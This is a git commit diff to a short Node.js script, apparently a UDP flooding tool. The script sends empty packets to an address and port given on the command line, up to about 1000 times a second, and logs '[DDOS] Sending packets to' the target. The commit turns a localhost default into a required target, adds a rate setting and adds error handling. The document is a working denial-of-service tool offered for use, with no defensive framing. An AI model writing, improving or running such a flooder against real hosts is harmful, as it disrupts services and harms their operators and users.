eff9e6db849d2f729570777d4ca4d75b11e9e005
LearXD <gutyxdcanal@gmail.com>
2022-07-03 20:14:51 -0300

    Update

--- index.js
+++ index.js
@@ -3,11 +3,21 @@ const client = dgram.createSocket('udp4');
 
 const args = process.argv;
 
-const address = args[2] ?? 'localhost'
-const port = args[3] ?? 19132
+const address = args[2] 
+const port = args[3]
+
+const times = args[4] ?? 1000
+
+if(!address || !port)
+  return console.log('[ERROR] Use: \'node . <address> <port> [<times>]\'')
+
+client.on('error', (e) => {
+  console.log('[ERROR]: ' + e)
+  process.kill(process.pid);
+})
 
 setInterval(() => {
     client.send('', 0, 0, port, address);
     console.log(`[DDOS] Sending packets to ${address}:${port}...`)
-}, 1)
+}, (1000 / (times <= 0 ? 1000 : times)))
     
